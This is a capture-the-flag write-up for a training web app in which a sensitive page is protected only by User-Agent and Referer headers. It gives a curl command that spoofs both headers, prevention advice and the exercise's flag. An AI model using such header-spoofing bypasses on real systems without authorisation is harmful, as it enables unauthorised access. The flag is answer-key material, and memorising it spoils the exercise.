## Breach 07 – Sensitive Page Accessible via Custom Headers

**Vulnerability:**  
Access to a sensitive page is gated by `User-Agent` and `Referer` headers, which can be easily spoofed by the client.

**OWASP Top 10 Mapping:**  
**A05:2021 – Security Misconfiguration**  
Relying on HTTP headers for access control is weak and easily bypassed using standard tools.

**Exploitation:**  
- Visited the page:
  ```
  http://localhost:8000/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
  ```
- Viewed the page source and found two comments:
  ```html
  <!--
  Let's use this browser : "ft_bornToSec". It will help you a lot.
  You must come from : "https://www.nsa.gov/".
  -->
  ```
- Used `curl` with the specified headers to access the flag:
  ```bash
  curl -e "https://www.nsa.gov/" -A "ft_bornToSec" \
    "http://localhost:8000/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
  ```
- The flag was returned in the HTML response.

**Prevention:**  
- Do not rely on client-controlled headers like `User-Agent` or `Referer` for authentication or access control.
- Implement proper session management and role-based access control.
- Remove sensitive information from HTML comments in production code.

**Flag:**  
`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
